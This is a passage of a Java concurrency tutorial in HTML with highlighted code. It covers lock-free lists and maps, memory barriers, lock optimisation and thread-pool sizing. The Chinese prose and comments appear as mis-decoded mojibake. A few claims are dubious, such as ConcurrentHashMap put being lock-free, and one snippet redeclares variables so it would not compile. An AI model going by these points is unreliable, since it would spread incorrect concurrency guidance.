        Node(E item) {
            <span class="hljs-built_in">this</span>.item = item;
        }
    }
    
    <span class="hljs-comment">// æ·»åŠ å…ƒç´ </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E item)</span> {
        Node&lt;E&gt; newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(item);
        Node&lt;E&gt; current = head.get();
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (head.compareAndSet(<span class="hljs-literal">null</span>, newNode)) {
                    <span class="hljs-keyword">return</span>;
                }
                current = head.get();
            } <span class="hljs-keyword">else</span> {
                Node&lt;E&gt; next = current.next.get();
                <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">if</span> (current.next.compareAndSet(<span class="hljs-literal">null</span>, newNode)) {
                        <span class="hljs-keyword">return</span>;
                    }
                } <span class="hljs-keyword">else</span> {
                    current = next;
                }
            }
        }
    }
    
    <span class="hljs-comment">// æŸ¥æ‰¾å…ƒç´ </span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(E item)</span> {
        Node&lt;E&gt; current = head.get();
        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (!current.marked &amp;&amp; current.item.equals(item)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            current = current.next.get();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h5 data-id="heading-107">4.3.2 æ— é”å“ˆå¸Œè¡¨</h5>
<p>æ— é”å“ˆå¸Œè¡¨çš„å®ç°éå¸¸å¤æ‚ï¼Œé€šå¸¸ä½¿ç”¨åˆ†æ®µé”æˆ–CASæ¥å®ç°ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªæ¦‚å¿µæ€§çš„è¯´æ˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¦‚å¿µæ€§å®ç°ï¼ˆå®é™…å®ç°æ›´å¤æ‚ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeHashMap</span>&lt;K, V&gt; {
    <span class="hljs-keyword">private</span> AtomicReferenceArray&lt;Node&lt;K, V&gt;&gt; buckets;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;K, V&gt; {
        K key;
        V value;
        AtomicReference&lt;Node&lt;K, V&gt;&gt; next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
        
        Node(K key, V value) {
            <span class="hljs-built_in">this</span>.key = key;
            <span class="hljs-built_in">this</span>.value = value;
        }
    }
    
    <span class="hljs-comment">// putæ“ä½œï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> hash % buckets.length();
        Node&lt;K, V&gt; newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(key, value);
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            Node&lt;K, V&gt; head = buckets.get(index);
            <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (buckets.compareAndSet(index, <span class="hljs-literal">null</span>, newNode)) {
                    <span class="hljs-keyword">return</span>;
                }
                head = buckets.get(index);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// éå†é“¾è¡¨ï¼ŒæŸ¥æ‰¾æˆ–æ’å…¥</span>
                <span class="hljs-comment">// ... å¤æ‚çš„CASæ“ä½œ</span>
            }
        }
    }
}
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> å®é™…çš„æ— é”å“ˆå¸Œè¡¨å®ç°éå¸¸å¤æ‚ï¼ŒJDKçš„ConcurrentHashMapä½¿ç”¨äº†åˆ†æ®µé”+CASçš„æ··åˆæ–¹å¼ã€‚</p>
<h4 data-id="heading-108">4.4 å†…å­˜å±éšœ</h4>
<h5 data-id="heading-109">4.4.1 å†…å­˜å±éšœçš„ä½œç”¨</h5>
<p>å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰æ˜¯ä¸€ç§CPUæŒ‡ä»¤ï¼Œç”¨äºæ§åˆ¶å†…å­˜æ“ä½œçš„é¡ºåºå’Œå¯è§æ€§ã€‚</p>
<p><strong>å†…å­˜å±éšœçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li><strong>é˜²æ­¢æŒ‡ä»¤é‡æ’åº</strong>ï¼šç¡®ä¿å±éšœå‰åçš„æŒ‡ä»¤ä¸ä¼šè¢«é‡æ’åº</li>
<li><strong>ä¿è¯å†…å­˜å¯è§æ€§</strong>ï¼šç¡®ä¿å±éšœå‰çš„å†™æ“ä½œå¯¹å±éšœåçš„è¯»æ“ä½œå¯è§</li>
<li><strong>ä¿è¯åŸå­æ€§</strong>ï¼šæŸäº›å†…å­˜å±éšœå¯ä»¥ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ul>
<p><strong>å†…å­˜å±éšœçš„ç±»å‹ï¼š</strong></p>
<ul>
<li><strong>Load Barrierï¼ˆè¯»å±éšœï¼‰</strong>ï¼šç¡®ä¿å±éšœå‰çš„è¯»æ“ä½œå®Œæˆ</li>
<li><strong>Store Barrierï¼ˆå†™å±éšœï¼‰</strong>ï¼šç¡®ä¿å±éšœå‰çš„å†™æ“ä½œå®Œæˆ</li>
<li><strong>Full Barrierï¼ˆå…¨å±éšœï¼‰</strong>ï¼šç¡®ä¿å±éšœå‰çš„æ‰€æœ‰æ“ä½œå®Œæˆ</li>
</ul>
<h5 data-id="heading-110">4.4.2 Javaä¸­çš„å†…å­˜å±éšœ</h5>
<p>Javaé€šè¿‡volatileå…³é”®å­—å’Œsynchronizedå…³é”®å­—æ¥ä½¿ç”¨å†…å­˜å±éšœï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// volatileä½¿ç”¨å†…å­˜å±éšœ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">()</span> {
        value = <span class="hljs-number">1</span>;  <span class="hljs-comment">// Store Barrierï¼šç¡®ä¿å†™æ“ä½œå®Œæˆ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> value;  <span class="hljs-comment">// Load Barrierï¼šç¡®ä¿è¯»æ“ä½œçœ‹åˆ°æœ€æ–°å€¼</span>
    }
}
</code></pre>
<p><strong>volatileçš„å†…å­˜è¯­ä¹‰ï¼š</strong></p>
<ul>
<li><strong>å†™æ“ä½œ</strong>ï¼šåœ¨å†™æ“ä½œåæ’å…¥Store Barrierï¼Œç¡®ä¿å†™æ“ä½œç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
<li><strong>è¯»æ“ä½œ</strong>ï¼šåœ¨è¯»æ“ä½œå‰æ’å…¥Load Barrierï¼Œç¡®ä¿ä»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼</li>
</ul>
<p><strong>synchronizedçš„å†…å­˜è¯­ä¹‰ï¼š</strong></p>
<ul>
<li><strong>è¿›å…¥åŒæ­¥å—</strong>ï¼šæ’å…¥Load Barrierï¼Œç¡®ä¿çœ‹åˆ°æœ€æ–°å€¼</li>
<li><strong>é€€å‡ºåŒæ­¥å—</strong>ï¼šæ’å…¥Store Barrierï¼Œç¡®ä¿å†™æ“ä½œåˆ·æ–°åˆ°ä¸»å†…å­˜</li>
</ul>
<h5 data-id="heading-111">4.4.3 å†…å­˜å±éšœçš„å®é™…åº”ç”¨</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1ï¼šè®¾ç½®æ ‡å¿—</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlag</span><span class="hljs-params">()</span> {
        flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// Store Barrierï¼šç¡®ä¿å†™æ“ä½œå®Œæˆ</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2ï¼šè¯»å–æ ‡å¿—</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">getFlag</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> flag;  <span class="hljs-comment">// Load Barrierï¼šç¡®ä¿è¯»å–æœ€æ–°å€¼</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨synchronizedä¿è¯å¯è§æ€§å’ŒåŸå­æ€§</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;  <span class="hljs-comment">// è¿›å…¥åŒæ­¥å—ï¼šLoad Barrier</span>
                  <span class="hljs-comment">// é€€å‡ºåŒæ­¥å—ï¼šStore Barrier</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count;  <span class="hljs-comment">// è¿›å…¥åŒæ­¥å—ï¼šLoad Barrier</span>
    }
}
</code></pre>
<h2 data-id="heading-112">5. æ€§èƒ½ä¼˜åŒ–</h2>
<h4 data-id="heading-113">5.1 é”ä¼˜åŒ–</h4>
<h5 data-id="heading-114">5.1.1 å‡å°‘é”çš„æŒæœ‰æ—¶é—´</h5>
<p>é”çš„æŒæœ‰æ—¶é—´è¶ŠçŸ­ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…çš„æ—¶é—´å°±è¶ŠçŸ­ï¼Œæ€§èƒ½å°±è¶Šå¥½ã€‚</p>
<p><strong>ä¸å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// æ‰§è¡Œä¸€äº›ä¸éœ€è¦åŒæ­¥çš„æ“ä½œ</span>
            doSomething1();  <span class="hljs-comment">// ä¸éœ€è¦é”</span>
            doSomething2();  <span class="hljs-comment">// ä¸éœ€è¦é”</span>
            
            <span class="hljs-comment">// åªæœ‰è¿™é‡Œéœ€è¦åŒæ­¥</span>
            sharedResource.update();
            
            <span class="hljs-comment">// æ‰§è¡Œä¸€äº›ä¸éœ€è¦åŒæ­¥çš„æ“ä½œ</span>
            doSomething3();  <span class="hljs-comment">// ä¸éœ€è¦é”</span>
            doSomething4();  <span class="hljs-comment">// ä¸éœ€è¦é”</span>
        }
    }
}
</code></pre>
<p><strong>å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ‰§è¡Œä¸éœ€è¦åŒæ­¥çš„æ“ä½œ</span>
        doSomething1();
        doSomething2();
        
        <span class="hljs-comment">// åªåœ¨éœ€è¦åŒæ­¥çš„åœ°æ–¹åŠ é”</span>
        <span class="hljs-keyword">synchronized</span> (lock) {
            sharedResource.update();
        }
        
        <span class="hljs-comment">// æ‰§è¡Œä¸éœ€è¦åŒæ­¥çš„æ“ä½œ</span>
        doSomething3();
        doSomething4();
    }
}
</code></pre>
<p><strong>æ€§èƒ½æå‡ï¼š</strong> é”çš„æŒæœ‰æ—¶é—´ä»æ•´ä¸ªæ–¹æ³•å‡å°‘åˆ°åªæœ‰å…³é”®æ“ä½œï¼Œå…¶ä»–çº¿ç¨‹çš„ç­‰å¾…æ—¶é—´å¤§å¤§å‡å°‘ã€‚</p>
<h5 data-id="heading-115">5.1.2 å‡å°é”çš„ç²’åº¦</h5>
<p>ä½¿ç”¨å¤šä¸ªç»†ç²’åº¦çš„é”ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç²—ç²’åº¦çš„å¤§é”ã€‚</p>
<p><strong>ä¸å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMap1</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// é”ä½æ‰€æœ‰èµ„æº</span>
            map1.put(key, value);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMap2</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// é”ä½æ‰€æœ‰èµ„æº</span>
            map2.put(key, value);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateList</span><span class="hljs-params">(String item)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// é”ä½æ‰€æœ‰èµ„æº</span>
            list.add(item);
        }
    }
}
</code></pre>
<p><strong>å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMap1</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// åªé”map1</span>
            map1.put(key, value);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMap2</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// åªé”map2</span>
            map2.put(key, value);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateList</span><span class="hljs-params">(String item)</span> {
        <span class="hljs-keyword">synchronized</span> (lock3) {  <span class="hljs-comment">// åªé”list</span>
            list.add(item);
        }
    }
}
</code></pre>
<p><strong>æ€§èƒ½æå‡ï¼š</strong> ä¸åŒèµ„æºçš„æ“ä½œå¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œä¸ä¼šç›¸äº’é˜»å¡ã€‚</p>
<h5 data-id="heading-116">5.1.3 é”åˆ†ç¦»</h5>
<p>å°†è¯»å†™æ“ä½œåˆ†ç¦»ï¼Œä½¿ç”¨è¯»å†™é”ã€‚</p>
<p><strong>ä¸å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// è¯»æ“ä½œä¹Ÿéœ€è¦é”</span>
            <span class="hljs-keyword">return</span> map.get(key);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// å†™æ“ä½œéœ€è¦é”</span>
            map.put(key, value);
        }
    }
}
</code></pre>
<p><strong>å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> lock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> lock.writeLock();
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
        readLock.lock();  <span class="hljs-comment">// è¯»é”ï¼šå¤šä¸ªè¯»æ“ä½œå¯ä»¥å¹¶å‘</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> map.get(key);
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(String key, String value)</span> {
        writeLock.lock();  <span class="hljs-comment">// å†™é”ï¼šç‹¬å </span>
        <span class="hljs-keyword">try</span> {
            map.put(key, value);
        } <span class="hljs-keyword">finally</span> {
            writeLock.unlock();
        }
    }
}
</code></pre>
<p><strong>æ€§èƒ½æå‡ï¼š</strong> å¤šä¸ªè¯»æ“ä½œå¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œå¤§å¤§æé«˜è¯»å¤šå†™å°‘åœºæ™¯çš„æ€§èƒ½ã€‚</p>
<h5 data-id="heading-117">5.1.4 é”ç²—åŒ–</h5>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå°†å¤šä¸ªè¿ç»­çš„é”æ“ä½œåˆå¹¶ä¸ºä¸€ä¸ªï¼Œå¯ä»¥å‡å°‘é”çš„è·å–å’Œé‡Šæ”¾å¼€é”€ã€‚</p>
<p><strong>ä¸å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// æ¯æ¬¡å¾ªç¯éƒ½è·å–å’Œé‡Šæ”¾é”</span>
                sharedResource.update(i);
            }
        }
    }
}
</code></pre>
<p><strong>å¥½çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {  <span class="hljs-comment">// åªè·å–ä¸€æ¬¡é”</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                sharedResource.update(i);
            }
        }
    }
}
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> é”ç²—åŒ–éœ€è¦è°¨æ…ä½¿ç”¨ï¼Œåªæœ‰åœ¨ç¡®å®šè¿ç»­æ“ä½œéƒ½éœ€è¦åŒæ­¥æ—¶æ‰ä½¿ç”¨ã€‚</p>
<h5 data-id="heading-118">5.1.5 æ— é”ç¼–ç¨‹</h5>
<p>ä½¿ç”¨æ— é”æ•°æ®ç»“æ„ï¼Œé¿å…é”çš„å¼€é”€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨AtomicIntegerä»£æ›¿synchronized</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count.incrementAndGet();  <span class="hljs-comment">// æ— é”æ“ä½œ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count.get();  <span class="hljs-comment">// æ— é”æ“ä½œ</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨ConcurrentHashMapä»£æ›¿synchronized HashMap</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentExample</span> {
    <span class="hljs-keyword">private</span> ConcurrentHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(String key, String value)</span> {
        map.put(key, value);  <span class="hljs-comment">// å†…éƒ¨ä½¿ç”¨CASï¼Œæ— é”</span>
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> map.get(key);  <span class="hljs-comment">// æ— é”è¯»å–</span>
    }
}
</code></pre>
<h4 data-id="heading-119">5.2 çº¿ç¨‹æ± ä¼˜åŒ–</h4>
<h5 data-id="heading-120">5.2.1 åˆç†è®¾ç½®çº¿ç¨‹æ•°</h5>
<p>çº¿ç¨‹æ•°çš„è®¾ç½®éœ€è¦æ ¹æ®ä»»åŠ¡ç±»å‹æ¥å†³å®šï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CPUå¯†é›†å‹ä»»åŠ¡</span>
<span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> cpuCount + <span class="hljs-number">1</span>;  <span class="hljs-comment">// CPUæ ¸å¿ƒæ•° + 1</span>

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    threadCount, threadCount, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);

<span class="hljs-comment">// IOå¯†é›†å‹ä»»åŠ¡</span>
<span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> cpuCount * <span class="hljs-number">2</span>;  <span class="hljs-comment">// CPUæ ¸å¿ƒæ•° * 2</span>

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    threadCount, threadCount * <span class="hljs-number">2</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h5 data-id="heading-121">5.2.2 é€‰æ‹©åˆé€‚çš„é˜Ÿåˆ—</h5>
<p>æ ¹æ®ä»»åŠ¡çš„ç‰¹ç‚¹é€‰æ‹©åˆé€‚çš„é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä»»åŠ¡æ•°é‡å¯é¢„ä¼°ï¼Œä½¿ç”¨æœ‰ç•Œé˜Ÿåˆ—</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>)  <span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—</span>
);

